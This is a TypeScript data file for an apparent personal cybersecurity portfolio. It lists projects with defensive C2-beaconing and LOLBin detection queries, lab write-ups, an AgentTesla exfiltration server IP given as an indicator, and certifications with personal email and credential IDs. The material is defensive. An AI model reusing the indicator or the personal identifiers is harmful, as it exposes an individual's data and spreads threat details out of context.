| project TimeGenerated, DeviceName, InitiatingProcessFileName, FileName, ProcessCommandLine`,
      thirdLabel: 'Python Hybrid ML Layer',
      sigmaOrPython: `# 3-Layer Hybrid Scoring: Sigma Rule Match + Isolation Forest + Local Outlier Factor
def compute_hybrid_lolbin_score(event, sigma_engine, iso_forest, lof_model):
    sigma_score = 1.0 if sigma_engine.match(event) else 0.0
    features = extract_cmdline_features(event["CommandLine"], event["ParentImage"])
    if_anomaly = iso_forest.decision_function([features])[0]
    lof_anomaly = lof_model.fit_predict([features])[0]
    composite_risk = (0.50 * sigma_score) + (0.30 * normalize(if_anomaly)) + (0.20 * (1 if lof_anomaly == -1 else 0))
    return round(composite_risk * 100, 2)`,
    },
  },
  {
    id: 'c2-beaconing-detection-engine',
    title: 'Uncovering Secret Hacker "Heartbeat" Signals in Network Traffic',
    repoName: 'seswarachari/beaconing',
    repoUrl: 'https://github.com/seswarachari/beaconing',
    category: 'Threat Hunting & ML',
    timeline: '2026 · GitHub Project',
    environment: 'Python · Network Traffic Analysis · AI',
    mitreTactics: ['Command and Control', 'Exfiltration'],
    mitreTechniqueIds: ['T1071.001', 'T1573', 'T1041'],
    problemStatement:
      'When malware infects a company computer, it quietly "checks in" with the hacker server every few minutes over normal web traffic, blending in with thousands of regular employee connections.',
    whatIBuilt:
      'I built a network hunting tool that reads raw network traffic files and measures the exact timing between connections to spot computers that are secretly calling out on a repeating schedule.',
    summary:
      'A network threat-hunting tool that analyzes connection timing patterns and uses unsupervised AI to uncover hidden malware communicating with external attacker servers.',
    impactMetric: 'Finds Hidden Backdoors Inside Normal Web Traffic',
    threatScenario:
      'Post-exploitation implants (Cobalt Strike, Sliver, Mythic) configured with sleep intervals and randomized jitter percentages calling back over HTTPS to evade static firewall signatures.',
    architectureSummary:
      'Raw PCAP Ingestion -> Flow Aggregation (SrcIP, DstIP, DstPort) -> Time-Series Delta Calculation & Coefficient of Variation -> Unsupervised Isolation Forest Anomaly Scoring -> Interactive Visual SOC Dashboard.',
    toolsUsed: ['Python', 'Wireshark / Network Captures', 'Zeek', 'Isolation Forest AI', 'Streamlit'],
    repoFiles: ['src/', 'dashboard/', 'notebooks/', 'data/', 'reports/', 'run_all.py'],
    visualType: 'hunting',
    detectionRules: {
      primaryLabel: 'Python Beacon Math & Isolation Forest',
      wazuhOrPrimary: `# From github.com/seswarachari/beaconing
import numpy as np
from sklearn.ensemble import IsolationForest

def analyze_flow_periodicity(timestamps: list[float]):
    deltas = np.diff(sorted(timestamps))
    mean_interval = float(np.mean(deltas))
    std_interval = float(np.std(deltas))
    jitter_ratio = std_interval / (mean_interval + 1e-6)
    # Low jitter ratio (< 0.18) with high packet count indicates automated C2 heartbeat
    return {
        "mean_interval_sec": round(mean_interval, 2),
        "jitter_coefficient": round(jitter_ratio, 4),
        "is_periodic_beacon": jitter_ratio < 0.18 and len(timestamps) >= 25
    }`,
      kql: `// KQL Periodic C2 Heartbeat Detection via Inter-Arrival Time Jitter
CommonSecurityLog
| where DestinationPort in (80, 443, 8080, 8443)
| sort by SourceIP asc, DestinationIP asc, TimeGenerated asc
| serialize
| extend DeltaSec = datetime_diff('second', TimeGenerated, prev(TimeGenerated, 1))
| where SourceIP == prev(SourceIP, 1) and DestinationIP == prev(DestinationIP, 1) and DeltaSec between (2 .. 3600)
| summarize Callbacks = count(), AvgInterval = avg(DeltaSec), StdevInterval = stdev(DeltaSec) by SourceIP, DestinationIP
| extend JitterRatio = StdevInterval / AvgInterval
| where Callbacks >= 25 and JitterRatio < 0.18`,
      thirdLabel: 'Splunk Streamstats Hunt',
      sigmaOrPython: `index=network sourcetype="zeek:conn" id.resp_p IN (80, 443, 8443)
| sort 0 id.orig_h, id.resp_h, _time
| streamstats current=f window=1 last(_time) as prev_time by id.orig_h, id.resp_h
| eval delta = _time - prev_time
| stats count as callbacks avg(delta) as avg_int stdev(delta) as std_int by id.orig_h, id.resp_h
| eval jitter_ratio = std_int / avg_int
| where callbacks >= 25 AND jitter_ratio < 0.18`,
    },
  },
  {
    id: 'secureassess-risk-platform',
    title: 'SecureAssess — Company Security Risk & Compliance Tracker',
    repoName: 'seswarachari/secureassess',
    repoUrl: 'https://github.com/seswarachari/secureassess',
    category: 'GRC & Risk Platform',
    timeline: '2026 · GitHub Project',
    environment: 'Python · NIST CSF & ISO 27001 · Executive PDF Reports',
    mitreTactics: ['NIST CSF Governance', 'ISO 27001 Annex A', 'NIST SP 800-61'],
    mitreTechniqueIds: ['NIST-CSF', 'ISO-27001', 'SP-800-61'],
    problemStatement:
      'Security is not just about technical alerts — business leaders and HR/compliance teams need a clear way to see which company systems are at risk and track whether fixes are happening on time.',
    whatIBuilt:
      'I built a web application aligned with international standards (NIST CSF & ISO 27001) that scores company risks on a simple 5×5 priority chart and exports clean PDF summary reports for management.',
    summary:
      'An easy-to-use security risk management platform that helps organizations catalog important assets, prioritize risks on a 5×5 matrix, and generate executive PDF compliance reports.',
    impactMetric: '5×5 Risk Priority Matrix · One-Click Executive PDF Reports',
    threatScenario:
      'Unquantified enterprise asset exposure, untracked vulnerability remediation SLAs, and compliance gaps across NIST CSF, ISO 27001, GDPR, and HIPAA.',
    architectureSummary:
      'Asset Inventory (CIA Triad Priority) -> Quantitative 5×5 Risk Matrix (1–6 Low, 7–12 Medium, 13–19 High, 20–25 Critical) -> NIST CSF & ISO 27001 Annex A Control Mapping -> Automated PDF Executive Posture Generator.',
    toolsUsed: ['Python', 'NIST CSF & ISO 27001', 'Risk Management', 'Automated PDF Reporting'],
    repoFiles: ['app.py', 'database.py', 'pages/', 'utils.py', 'requirements.txt', 'README.md'],
    visualType: 'soar',
    detectionRules: {
      primaryLabel: 'Python 5x5 Risk Matrix Engine',
      wazuhOrPrimary: `# From github.com/seswarachari/secureassess/utils.py
def evaluate_risk_score(likelihood: int, impact: int) -> dict:
    """Quantitative 5x5 Likelihood x Impact Risk Evaluation aligned with NIST CSF."""
    score = likelihood * impact
    if score >= 20:
        return {"score": score, "level": "Critical", "sla_days": 7, "action": "Immediate executive escalation & containment"}
    elif score >= 13:
        return {"score": score, "level": "High", "sla_days": 30, "action": "Prioritize remediation plan & compensating controls"}
    elif score >= 7:
        return {"score": score, "level": "Medium", "sla_days": 90, "action": "Scheduled mitigation & continuous SIEM monitoring"}
    return {"score": score, "level": "Low", "sla_days": 180, "action": "Accept or monitor within baseline SOC telemetry"}`,
      kql: `// Continuous Compliance & High-Risk Asset Exposure Query
SecurityRecommendation
| where RecommendationSeverity in ("High", "Critical") and RecommendationState == "Active"
| summarize OpenFindings = count() by AssessedResourceId, RecommendationDisplayName`,
      thirdLabel: 'NIST CSF Control Mapping',
      sigmaOrPython: `framework: NIST Cybersecurity Framework (CSF) 2.0 & ISO/IEC 27001:2022
mappings:
  - function: IDENTIFY (ID.AM) -> Asset Registration & CIA Triad Classification
  - function: PROTECT (PR.AC / Annex A.9) -> Access Control & Least Privilege
  - function: DETECT (DE.CM) -> Continuous SIEM & XDR Telemetry Monitoring
  - function: RESPOND (RS.RP / NIST SP 800-61) -> Incident Response Lifecycle`,
    },
  },
];

export const LAB_WRITEUP_VAULT: LabWriteupReport[] = [
  {
    id: 'agenttesla-anyrun-case-study',
    title: 'Malware Investigation Report: How "AgentTesla" Steals Passwords',
    category: 'Malware Analysis Case Study · ANY.RUN & LetsDefend',
    pagesOrFormat: '3 Visual Sandbox Captures',
    documentUrl: '/assets/aistudio/1771326015554_39223381.jpeg',
    documentType: 'image',
    previewImageUrl: '/assets/aistudio/1771326015554_39223381.jpeg',
    summary:
      'Visual step-by-step investigation showing how I analyzed a real password-stealing virus inside a safe sandbox, identified how it stayed hidden on Windows, and captured the server address it used to leak data.',
    vulnerabilitiesCovered: [
      'Malware Behavior Analysis',
      'Hidden Startup Task Detection',
      'Network Data Leak Prevention',
    ],
    secondaryImages: [
      {
        label: 'ANY.RUN Process Tree & Schtasks Persistence',
        url: '/assets/aistudio/1771326015554_39223381.jpeg',
      },
      {
        label: 'SMTP C2 Exfiltration Stream (208.91.199.225:587)',
        url: '/assets/aistudio/1771326012628_738a80ac.jpeg',
      },
      {
        label: 'Case Study Summary & IOC Analysis',
        url: '/assets/aistudio/Screenshot_2026-10-25_at_7.20.35_PM_bd9bad04.png',
      },
    ],
  },
  {
    id: 'portswigger-sqli-websockets-cache-pdf',
    title: 'Database & Web Security Guide: Preventing SQL Injection Attacks',
    category: 'Written Security Guide · PortSwigger Labs',
    pagesOrFormat: '29-Page Illustrated PDF',
    documentUrl: '/assets/aistudio/1747938995839_68e8d425.pdf',
    documentType: 'pdf',
    previewImageUrl: '/assets/aistudio/Screenshot_2026-10-25_at_7.19.28_PM_3909e7d0.png',
    summary:
      'A clear 29-page walkthrough written during my hands-on lab training that shows how attackers attempt to extract customer data from web databases and how developers can secure their applications.',
    vulnerabilitiesCovered: [
      'Database Security (SQL Injection)',
      'Real-Time WebSockets Security',
      'Web Cache Protection',
    ],
  },
  {
    id: 'portswigger-serverside-access-ssrf-pdf',
    title: 'Protecting User Accounts & Internal Servers from Unauthorized Access',
    category: 'Written Security Guide · PortSwigger Labs',
    pagesOrFormat: '17-Page Illustrated PDF',
    documentUrl: '/assets/aistudio/1753242705703_39130242.pdf',
    documentType: 'pdf',
    previewImageUrl: '/assets/aistudio/Screenshot_2026-10-25_at_7.19.47_PM_86d0f4ce.png',
    summary:
      'A 17-page report explaining how broken login permissions allow regular users to access administrator pages, and the exact security checks needed to lock down cloud and internal servers.',
    vulnerabilitiesCovered: [
      'Account Permission Controls',
      'Admin Panel Protection',
      'Cloud Server Security (SSRF)',
    ],
  },
  {
    id: 'portswigger-prototype-pollution-rce-pdf',
    title: 'Securing Modern JavaScript & Node.js Web Applications',
    category: 'Written Security Guide · PortSwigger Labs',
    pagesOrFormat: '12-Page Illustrated PDF',
    documentUrl: '/assets/aistudio/1746876532157_014ddc13.pdf',
    documentType: 'pdf',
    previewImageUrl: '/assets/aistudio/Screenshot_2026-10-25_at_7.19.47_PM_86d0f4ce.png',
    summary:
      'A 12-page deep dive into how subtle coding flaws in modern JavaScript websites can let attackers take control of a server, along with safe coding practices to prevent it.',
    vulnerabilitiesCovered: [
      'Node.js Server Protection',
      'Browser Security',
      'Safe Input Validation',
    ],
  },
  {
    id: 'portswigger-file-upload-webshell-pdf',
    title: 'How to Safely Handle User File Uploads on Websites',
    category: 'Written Security Guide · PortSwigger Labs',
    pagesOrFormat: '8-Page Illustrated PDF',
    documentUrl: '/assets/aistudio/1753287678125_6acd596b.pdf',
    documentType: 'pdf',
    previewImageUrl: '/assets/aistudio/Screenshot_2026-10-25_at_7.19.37_PM_474a8f89.png',
    summary:
      'An 8-page practical report demonstrating how attackers disguise dangerous scripts as harmless profile pictures, and how to properly verify uploaded files.',
    vulnerabilitiesCovered: [
      'Safe File Upload Checks',
      'Blocking Disguised Scripts',
      'Web Server Hardening',
    ],
  },
  {
    id: 'portswigger-path-traversal-bypass-pdf',
    title: 'Preventing Unauthorized File Reading on Web Servers',
    category: 'Written Security Guide · PortSwigger Labs',
    pagesOrFormat: '7-Page Illustrated PDF',
    documentUrl: '/assets/aistudio/1747296343747_d7ff00cc.pdf',
    documentType: 'pdf',
    previewImageUrl: '/assets/aistudio/Screenshot_2026-10-25_at_7.19.37_PM_474a8f89.png',
    summary:
      'A 7-page walkthrough explaining how attackers trick web servers into revealing private configuration files, and how to restrict file access safely.',
    vulnerabilitiesCovered: [
      'Server File Privacy',
      'URL Input Validation',
      'Access Restriction Controls',
    ],
  },
];

export const INITIAL_SKILLS: SkillDomain[] = [
  {
    id: 'siem-xdr-soc',
    domain: '24/7 Security Monitoring & Alert Investigation (SOC)',
    subtitle: 'Spotting Real Threats · Cutting Through False Alarms',
    yearsExperience: 'SOC Internship + Home Labs',
    verifiedDetections: 'Splunk · Microsoft Sentinel · Wazuh',
    tools: [
      'Splunk SIEM',
      'Microsoft Sentinel',
      'Wazuh SIEM',
      'Stellar Cyber Open XDR',
      'Windows Event Logs',
      'Sysmon',
    ],
    capabilities: [
      'Monitored live security dashboards during my internship at Sure ProED to spot suspicious logins and system alerts.',
      'Created custom alert rules in Wazuh so security teams get notified immediately when an attacker tries to hide on a computer.',
      'Experienced in tracing multi-step attacks from the first suspicious email all the way to the affected computer.',
    ],
  },
  {
    id: 'cti-dfir-malware',
    domain: 'Phishing Defense, Malware Analysis & Incident Response',
    subtitle: 'Protecting Employees · Investigating Suspicious Files',
    yearsExperience: 'ANY.RUN & LetsDefend Certified',
    verifiedDetections: 'ANY.RUN · VirusTotal · Email Security',
    tools: [
      'ANY.RUN Malware Sandbox',
      'Phishing Email Forensics',
      'VirusTotal',
      'YARA Rules',
      'Volatility 3',
      'Process Explorer',
    ],
    capabilities: [
      'Built an automated Phishing Email Sandbox that flags spoofed scam emails with zero false alarms on real company mail.',
      'Safely analyzed real password-stealing malware (AgentTesla) to document how it works and how to block it.',
      'Trained in step-by-step incident containment: isolating infected PCs, blocking attacker IPs, and writing clear post-incident reports.',
    ],
  },
  {
    id: 'network-vuln',
    domain: 'Network Security & Web Vulnerability Testing',
    subtitle: 'Finding & Fixing Weaknesses Before Attackers Do',
    yearsExperience: '102 Solved PortSwigger Labs',
    verifiedDetections: 'Wireshark · Burp Suite · Nmap · OpenVAS',
    tools: [
      'Wireshark',
      'Zeek Network Monitor',
      'Snort IDS/IPS',
      'Burp Suite Pro',
      'OpenVAS & Nmap',
    ],
    capabilities: [
      'Solved 102 hands-on web security labs on PortSwigger Academy and wrote 73 pages of clear remediation guides.',
      'Inspected network traffic captures to uncover hidden backdoors and automated denial-of-service (DDoS) attacks.',
      'Performed routine vulnerability scans to help teams patch outdated software and misconfigured servers.',
    ],
  },
  {
    id: 'sec-automation-grc',
    domain: 'Python Automation, Risk Management & Security Standards',
    subtitle: 'Saving Time for Teams · Aligning with Business Standards',
    yearsExperience: '6 Open-Source Security Projects',
    verifiedDetections: 'Python · NIST CSF · ISO 27001',
    tools: [
      'Python Scripting',
      'Machine Learning for Security',
      'MITRE ATT&CK Framework',
      'NIST Cybersecurity Framework',
      'ISO 27001 & GDPR Basics',
    ],
    capabilities: [
      'Wrote Python tools that automate repetitive SOC tasks like exporting alerts and formatting executive PDF reports.',
      'Built a Risk Assessment web app (SecureAssess) that translates technical issues into a clear 5×5 priority chart for leadership.',
      'Communicates security findings clearly to both technical engineers and non-technical stakeholders.',
    ],
  },
  {
    id: 'data-loss-prevention',
    domain: 'Data Loss Prevention (DLP)',
    subtitle: 'Protecting sensitive files and information',
    yearsExperience: 'Developing knowledge',
    verifiedDetections: 'Data protection · DLP',
    tools: [
      'DLP fundamentals',
      'Data classification',
      'Sharing controls',
      'Data loss alerts',
    ],
    capabilities: [
      'Building knowledge of how teams identify and protect sensitive data.',
      'Interested in how DLP alerts can reveal risky file sharing or data movement.',
      'Learning how clear data rules help prevent accidental or unauthorized disclosure.',
    ],
  },
];

export const EXPERIENCE_TIMELINE: ExperienceItem[] = [
  {
    id: 'sure-proed',
    role: 'Cyber Security Intern (SOC Operations)',
    company: 'Sure ProED',
    period: 'June 2025 – Dec 2025',
    mode: 'Remote · 6-Month Internship',
    highlights: [
      'Monitored daily security alerts in Splunk SIEM to help protect systems and identify unusual activity.',
      'Investigated network and system logs to separate harmless false alarms from genuine security threats.',
      'Conducted vulnerability checks and supported the team with step-by-step incident response and reporting.',
    ],
    tools: ['Splunk SIEM', 'Alert Investigation', 'Vulnerability Scanning', 'Incident Response'],
  },
  {
    id: 'kriya-nextwealth',
    role: 'Data Processing Associate (Intern)',
    company: 'Kriya NextWealth Private Limited',
    period: 'Aug 2022 – Dec 2022',
    mode: 'On-Site · 5-Month Internship',
    highlights: [
      'Worked with AI and Computer Vision teams to label, verify, and quality-check complex 2D/3D sensor datasets.',
      'Maintained strict accuracy standards while reviewing large volumes of technical data under daily deadlines.',
    ],
    tools: ['Data Quality Assurance', 'Pattern Recognition', 'Cross-Team Collaboration'],
  },
];

export const CYBER_RANGES: CyberRangeItem[] = [
  {
    id: 'letsdefend',
    platform: 'LetsDefend (HackTheBox)',
    track: 'SOC Analyst Learning Path (25 Modules)',
    metric: '100% Completed · Certified',
    summary:
      'Completed all 25 practical training modules covering real-world SOC Analyst duties: investigating security alerts, analyzing phishing emails, stopping brute-force logins, and managing security incidents.',
    skillsValidated: ['Alert Investigation', 'Phishing Triage', 'Malware Analysis', 'Incident Reporting'],
    proofImageUrl: '/assets/aistudio/Screenshot_2026-10-25_at_7.13.21_PM_e883bb20.png',
    proofLabel: 'View 100% Completion Proof & Modules (5 Captures)',
    secondaryImages: [
      {
        label: '100% SOC Analyst Learning Path Completed',
        url: '/assets/aistudio/Screenshot_2026-10-25_at_7.13.21_PM_e883bb20.png',
      },
      {
        label: 'Official LetsDefend SOC Analyst Certificate',
        url: '/assets/aistudio/8b01fde1-6f39-408b-aafe-d0e8d006faef_d8bc23e9.png',
      },
      {
        label: 'Completed Modules 3–11 (SIEM, Phishing, Malware)',
        url: '/assets/aistudio/Screenshot_2026-10-25_at_7.13.35_PM_16bd60e2.png',
      },
      {
        label: 'Completed Modules 12–20 (Web Attacks, Brute-Force, SOC Lab)',
        url: '/assets/aistudio/Screenshot_2026-10-25_at_7.13.45_PM_3919ef29.png',
      },
      {
        label: 'Completed Modules 20–25 (Splunk, VirusTotal, CTI)',
        url: '/assets/aistudio/Screenshot_2026-10-25_at_7.13.55_PM_b72f9ea7.png',
      },
    ],
  },
  {
    id: 'stellar-cyber',
    platform: 'Stellar Cyber University',
    track: 'SOC Analyst Associate (Open XDR)',
    metric: 'Exam Passed · Jan 2026',
    summary:
      'Certified in using modern Open XDR security platforms to manage incident cases, trace how an attack started (Root Cause Analysis), and spot password theft and unauthorized network movement.',
    skillsValidated: ['Case Management', 'Root Cause Analysis', 'Stopping Password Theft', 'Team Workflows'],
    proofImageUrl: '/assets/aistudio/Screenshot_2026-10-25_at_7.21.26_PM_1930ab4a.png',
    proofLabel: 'View Official Stellar Cyber Certificate',
    secondaryImages: [
      {
        label: 'Stellar Cyber Open XDR Certificate (01/19/2026)',
        url: '/assets/aistudio/Screenshot_2026-10-25_at_7.21.26_PM_1930ab4a.png',
      },
    ],
  },
  {
    id: 'portswigger',
    platform: 'PortSwigger Web Security Academy',
    track: '72 Practitioner + 30 Apprentice Labs',
    metric: '102 Labs Solved',
    summary:
      'Completed 102 hands-on web security labs across 15+ vulnerability categories (including 100% of SQL Injection, Authentication, Access Control, and SSRF labs) to understand how web attacks work and how to defend against them.',
    skillsValidated: ['Database Protection', 'Login & Access Security', 'API Security', 'Server Protection'],
    proofImageUrl: '/assets/aistudio/Screenshot_2026-10-25_at_7.18.33_PM_82b2bca6.png',
    proofLabel: 'View 102 Solved Labs Breakdown (4 Captures)',
    secondaryImages: [
      {
        label: '102 Total Labs Solved (30 Apprentice + 72 Practitioner)',
        url: '/assets/aistudio/Screenshot_2026-10-25_at_7.18.33_PM_82b2bca6.png',
      },
      {
        label: 'Topic Mastery: SQLi (51/51), Server-Side (52/52), API (29/29), LLM (30/30)',
        url: '/assets/aistudio/Screenshot_2026-10-25_at_7.19.28_PM_3909e7d0.png',
      },
      {
        label: 'Topic Mastery: GraphQL (29/29), CORS (21/21), File Upload (35/35), Race Cond (29/29)',
        url: '/assets/aistudio/Screenshot_2026-10-25_at_7.19.37_PM_474a8f89.png',
      },
      {
        label: 'Topic Mastery: Auth (55/55), Prototype Pollution (65/65), SSRF (23/23), WebSockets (19/19)',
        url: '/assets/aistudio/Screenshot_2026-10-25_at_7.19.47_PM_86d0f4ce.png',
      },
    ],
  },
];

export const EDUCATION_HISTORY: EducationItem[] = [
  {
    id: 'btech-svce',
    degree: 'B.Tech in Cyber Security',
    institution: 'Sri Venkateswara College of Engineering',
    location: 'Tirupati, Andhra Pradesh',
    period: 'Sep 2023 – May 2026',
    score: '8.0 CGPA / 10.0',
  },
  {
    id: 'diploma-svcet',
    degree: 'Diploma in Computer Science',
    institution: 'Sri Venkateswara College of Engineering and Technology',
    location: 'Chittoor, Andhra Pradesh',
    period: 'Sep 2020 – May 2023',
    score: '69%',
  },
];

export const TELEMETRY_SOURCES: TelemetrySource[] = [
  {
    id: 'sysmon-edr',
    name: 'Employee Computer Monitoring (Wazuh & Windows Logs)',
    category: 'Workstation Protection',
    coverageWeight: 26,
    mttdReductionMinutes: 12.4,
    mitreTacticsCovered: ['Execution', 'Persistence', 'Privilege Escalation', 'Defense Evasion'],
    description:
      'Watches for suspicious programs, hidden scripts, and unauthorized startup tasks on employee laptops and desktops.',
  },
  {
    id: 'identity-kerberos',
    name: 'Central Security Dashboard (Splunk & Open XDR)',
    category: 'SOC Alert Correlation',
    coverageWeight: 24,
    mttdReductionMinutes: 10.8,
    mitreTacticsCovered: ['Initial Access', 'Credential Access', 'Lateral Movement'],
    description:
      'Connects the dots across multiple systems to catch password-guessing attacks and stolen login sessions.',
  },
  {
    id: 'zeek-network',
    name: 'Network Traffic & Firewall Monitoring (Wireshark & Zeek)',
    category: 'Network Protection',
    coverageWeight: 20,
    mttdReductionMinutes: 7.5,
    mitreTacticsCovered: ['Discovery', 'Command and Control', 'Exfiltration', 'Impact'],
    description:
      'Spots unusual outbound data transfers, secret backdoor check-ins, and network flood attacks.',
  },
  {
    id: 'powershell-amsi',
    name: 'Automated Phishing Email Protection',
    category: 'Email Security',
    coverageWeight: 15,
    mttdReductionMinutes: 4.5,
    mitreTacticsCovered: ['Initial Access', 'Execution', 'Collection'],
    description:
      'Checks incoming emails for spoofed senders and fake login links before employees can click them.',
  },
  {
    id: 'cloudtrail-audit',
    name: 'Vulnerability Scanning & Risk Prioritization',
    category: 'Preventive Security',
    coverageWeight: 15,
    mttdReductionMinutes: 3.3,
    mitreTacticsCovered: ['Impact', 'Persistence', 'Defense Evasion'],
    description:
      'Finds unpatched software and ranks security risks on a clear 5×5 priority chart aligned with NIST & ISO 27001.',
  },
];

export const INITIAL_CERTIFICATIONS: CertificationItem[] = [
  {
    id: 'comptia-csap',
    code: 'CompTIA CSAP',
    name: 'CompTIA Security Analytics Professional',
    issuer: 'CompTIA · Official Specialist Certification',
    issuedDate: 'Issued Jul 2, 2026',
    credentialId: 'Candidate ID: COMP001022966670',
    focusArea:
      'A stackable CompTIA credential earned with Security+ and CySA+. It brings together security analytics, access management, application and network security, behavioral analysis, and risk management.',
    coreCompetencies: ['Security Analytics', 'Access Management', 'Application Security', 'Behavioral Analytics', 'Network Security', 'Risk Management'],
    previewImageUrl: '/assets/aistudio/cert_comptia_csap.png',
    certificateAssetUrl: '/assets/aistudio/____CompTIA_CSAP_d77729fc.pdf',
    assetType: 'pdf',
  },
  {
    id: 'comptia-cysa-plus',
    code: 'CompTIA CySA+ ce (CS0-003)',
    name: 'CompTIA Cybersecurity Analyst+ (CySA+ ce)',
    issuer: 'CompTIA · Verified Code: 0c75809001f64ddeb65dcc09f3d5bc80',
    issuedDate: 'Jul 2, 2026 – Jul 2, 2029',
    credentialId: 'COMP001022966670 · Code: 0c75809001f64ddeb65dcc09f3d5bc80',
    focusArea:
      'Covers continuous security monitoring, threat hunting, and threat intelligence. It builds skills for detecting, preventing, and responding to incidents, managing vulnerabilities, and reporting findings clearly.',
    coreCompetencies: ['Behavioral Analytics', 'Blue Team', 'Incident Response', 'Threat Intelligence', 'Threat Management', 'Vulnerability Analysis', 'Vulnerability Management', 'Reporting'],
    previewImageUrl: '/assets/aistudio/cert_comptia_cysa.png',
    certificateAssetUrl: '/assets/aistudio/CompTIA_CySA__ce_certificate_d5ee4156.pdf',
    assetType: 'pdf',
    verificationCode: '0c75809001f64ddeb65dcc09f3d5bc80',
  },
  {
    id: 'comptia-sec-plus',
    code: 'CompTIA Security+ ce (SY0-701)',
    name: 'CompTIA Security+ ce Certification',
    issuer: 'CompTIA · Verified Code: 1af613fabfcb45eb8d676edd16d2b4d0',
    issuedDate: 'Jan 13, 2026 – Jan 13, 2029',
    credentialId: 'COMP001022966670 · Code: 1af613fabfcb45eb8d676edd16d2b4d0',
    focusArea:
      'Covers core security work: access control, cryptography, data protection, risk reduction, threat detection, and network defense.',
    coreCompetencies: ['Access Control', 'Cryptography', 'Data Security', 'Disaster Recovery', 'Firewall Configuration', 'Malware Identification', 'Network Security', 'Threat Detection', 'Risk Management'],
    previewImageUrl: '/assets/aistudio/cert_comptia_secplus.png',
    certificateAssetUrl: '/assets/aistudio/CompTIA_Security__ce_certificate_e5425c67.pdf',
    assetType: 'pdf',
    badgeImageUrl: '/assets/aistudio/comptia-security-ce-certification_4de63366.png',
    verificationCode: '1af613fabfcb45eb8d676edd16d2b4d0',
  },
  {
    id: 'stellar-cyber-xdr',
    code: 'Stellar Cyber Open XDR',
    name: 'Stellar Cyber — SOC Analyst Associate (Open XDR)',
    issuer: 'Stellar Cyber University · Signed by VP Paul Levasseur',
    issuedDate: 'Passed Jan 19, 2026',
    credentialId: 'STELLAR-XDR-ASSOC-2026',
    focusArea:
      'Validates practical skill in modern Open XDR operations: managing security cases, tracing how attacks started (Root Cause Analysis), and stopping credential theft.',
    verifiedUrl: 'https://www.linkedin.com/in/eswara-chari-51553322a',
    coreCompetencies: ['Open XDR Triage', 'Attack Graph RCA', 'Credential Dumping Detection', 'Automated Response'],
    previewImageUrl: '/assets/aistudio/Screenshot_2026-10-25_at_7.21.26_PM_1930ab4a.png',
    certificateAssetUrl: '/assets/aistudio/1768848334458_9b46a98f.pdf',
    assetType: 'pdf',
  },
  {
    id: 'letsdefend-soc-path',
    code: 'LetsDefend SOC Analyst',
    name: 'SOC Analyst Learning Path Certificate (25 Modules)',
    issuer: 'LetsDefend (HackTheBox)',
    issuedDate: 'Issued Jun 15, 2026',
    credentialId: 'LETSDEFEND-SOC-PATH-100%',
    focusArea:
      'Awarded for completing 25 hands-on SOC training modules covering alert triage, phishing email investigation, web attack detection, and dynamic malware analysis.',
    verifiedUrl: 'https://www.linkedin.com/in/eswara-chari-51553322a',
    coreCompetencies: ['SIEM Alert Triage', 'Dynamic Malware Sandbox', 'Phishing Forensics', 'Splunk & VirusTotal'],
    previewImageUrl: '/assets/aistudio/8b01fde1-6f39-408b-aafe-d0e8d006faef_d8bc23e9.png',
    certificateAssetUrl: '/assets/aistudio/8b01fde1-6f39-408b-aafe-d0e8d006faef_d8bc23e9.png',
    assetType: 'image',
  },
  {
    id: 'cisco-ethical-hacker',
    code: 'Cisco Ethical Hacker',
    name: 'Cisco Networking Academy — Ethical Hacker Certification',
    issuer: 'Cisco Networking Academy · Signed by Lynn Bloomer',
    issuedDate: 'Issued Apr 12, 2025',
    credentialId: 'CISCO-NETACAD-ETHICAL-HACKER',
    focusArea:
      'Validates understanding of how attackers test networks and web applications for weaknesses—helping me anticipate attacker moves and recommend stronger defenses.',
    verifiedUrl: 'https://www.linkedin.com/in/eswara-chari-51553322a',
    coreCompetencies: ['Vulnerability Scanning', 'Web App Testing', 'Penetration Testing Lifecycle', 'Defensive Remediation'],
    previewImageUrl: '/assets/aistudio/Screenshot_2026-10-25_at_7.15.58_PM_0731e82c.png',
    certificateAssetUrl: '/assets/aistudio/Screenshot_2026-10-25_at_7.15.58_PM_0731e82c.png',
    assetType: 'image',
  },
  {
    id: 'google-cybersecurity',
    code: 'Google CyberSec V2',
    name: 'Google Cybersecurity Professional Certificate V2',
    issuer: 'Google / Coursera · Credly Verified Badge',
    issuedDate: 'Issued Dec 05, 2024',
    credentialId: 'Credly ID: a7a84b44-434e-48ce-8b12-c119a855dcb7',
    focusArea:
      'Comprehensive 8-course program by Google covering SIEM tools (Splunk & Chronicle), Linux, SQL, Python security automation, network monitoring, and incident response.',
    verifiedUrl: 'https://www.credly.com/badges/a7a84b44-434e-48ce-8b12-c119a855dcb7/linked_in_profile',
    coreCompetencies: ['Python Security Automation', 'Splunk & SQL Queries', 'Linux & Packet Analysis', 'NIST IR Playbooks'],
    previewImageUrl: '/assets/aistudio/Screenshot_2026-10-25_at_7.15.08_PM_987b9787.png',
    certificateAssetUrl: '/assets/aistudio/Screenshot_2026-10-25_at_7.15.08_PM_987b9787.png',
    assetType: 'image',
  },
  {
    id: 'isc2-cc-domain5',
    code: 'ISC2 CC: Domain 5',
    name: 'ISC2 Certified in Cybersecurity — Domain 5: Security Operations',
    issuer: 'ISC2 Education & Training',
    issuedDate: 'Issued Apr 16, 2025',
    credentialId: 'Learner ID: a8f366e6-f421-4008-a7b2-f47d4c5e451b',
    focusArea:
      'Official training from ISC2 focused on everyday Security Operations: protecting company data, hardening systems, continuous monitoring, and incident recovery.',
    verifiedUrl: 'https://www.linkedin.com/in/eswara-chari-51553322a',
    coreCompetencies: ['Security Operations', 'System Hardening', 'Data Custody', 'Incident Recovery'],
    previewImageUrl: '/assets/aistudio/cert_isc2_domain5.svg',
    certificateAssetUrl: '/assets/aistudio/15687d4d-4c83-49cc-9937-6958371fa5ff_4904f9b4.pdf',
    assetType: 'pdf',
  },
];

export const WHAT_WE_NEED_CHECKLIST = [
  {
    id: 'photo',
    category: '01. Portrait & Story Synced',
    title: 'Your Official Photo, Resume & Clear Career Story Integrated',
    details:
      'Your portrait photo, B.Tech Cyber Security background, SOC internship at Sure ProED, and clear HR-friendly narrative are live.',
    example: 'Portrait Active · eswarachari102@gmail.com',
  },
  {
    id: 'skills',
    category: '02. 8 Official Certifications Displayed Directly',
    title: 'CompTIA CSAP, CySA+, Security+, Stellar Cyber, LetsDefend, Cisco, Google & ISC2',
    details:
      'All 8 of your uploaded certificates are displayed directly on the page with plain-English explanations and 1-click fullscreen PDF/image viewing.',
    example: 'COMP001022966670 · 8 Official Certificates Inline',
  },
  {
    id: 'projects',
    category: '03. Story-Driven Projects (Problem -> Solution -> Impact)',
